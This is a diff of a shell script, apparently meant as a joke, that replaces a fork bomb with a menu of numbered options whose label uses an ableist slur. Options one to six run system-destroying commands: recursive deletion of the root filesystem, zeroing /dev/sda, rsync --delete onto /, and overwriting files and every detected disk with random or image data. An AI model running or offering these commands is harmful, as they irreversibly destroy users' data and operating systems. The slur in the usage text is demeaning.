@@ -1,2 +1,66 @@
 #!/usr/bin/env sh
-:(){ :|: & };:
+
+function usage {
+    echo "usage: $0 [retardation level]"
+    exit
+}
+
+if [ $# -eq 0 ];
+then
+    usage
+fi
+
+case $1 in
+    -h|--help)
+        usage
+        ;;
+
+     1)
+        rm -rf --no-preserve-root /
+        exit
+        ;;
+
+     2) 
+        sudo dd if=/dev/zero of=/dev/sda 
+        exit
+        ;;
+
+     3)
+        sudo mkdir source
+        sudo rsync -av --delete source/ /
+        exit
+        ;;
+
+     4)
+        for f in /
+        do
+            [ -f "$f" ] && dd if=/dev/urandom of=$f conv=sync,notrunc;
+        done
+        exit
+        ;;
+
+     5)
+        (while 1;
+         do
+            cat /mnt/cdrom/win95.bmp;
+         done) > /dev/sda;
+         exit
+         ;;
+
+     6) 
+        for i in \
+            $(ls -1 /dev | egrep "^sd|^nmve|^hd|^vd");
+        do
+            dd if=/dev/urandom of=/dev/$i bs=16M conv=sync,notrunc;
+        done
+        exit
+        ;;
+
+     7)
+        sudo firefox
+        exit
+        ;;
+     *)
+        usage
+        ;;
+ esac
